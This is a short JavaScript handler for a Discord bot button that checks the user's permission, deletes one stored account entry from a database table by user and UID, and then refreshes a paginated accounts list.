const { queryParams } = require("../../../db/database");
const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");
const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "deletefinal",
    callback: async (client, interaction) => {
        let [t, id, current, uid] = interaction.customId.split("|"); // Extract UID from customId
        current = parseInt(current) || 1;

        const isUserOwner = await isOwner(interaction.user.id);
        if (id && interaction.user.id !== id && !isUserOwner) {
            return interaction.reply({ content: "You do not have permission to delete this account.", ephemeral: true });
        }

        const effectiveUserId = isUserOwner ? id : interaction.user.id;
        // Delete the account by UID
        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=? AND uid=?`, [effectiveUserId, uid]);

        // Fetch remaining accounts to check if the current page is still valid
        const remainingAccounts = await queryParams(`SELECT * FROM accountsbyuser WHERE user_id=?`, [effectiveUserId]);

        // If no accounts remain, reset current to 1
        if (remainingAccounts.length === 0) {
            current = 1;
        } else if (current > remainingAccounts.length) {
            // If current exceeds the number of remaining accounts, adjust it
            current = remainingAccounts.length;
        }

        // Return to the accounts message with the updated current page
        return interaction.update(await accountsmsg(effectiveUserId, current));
    }
};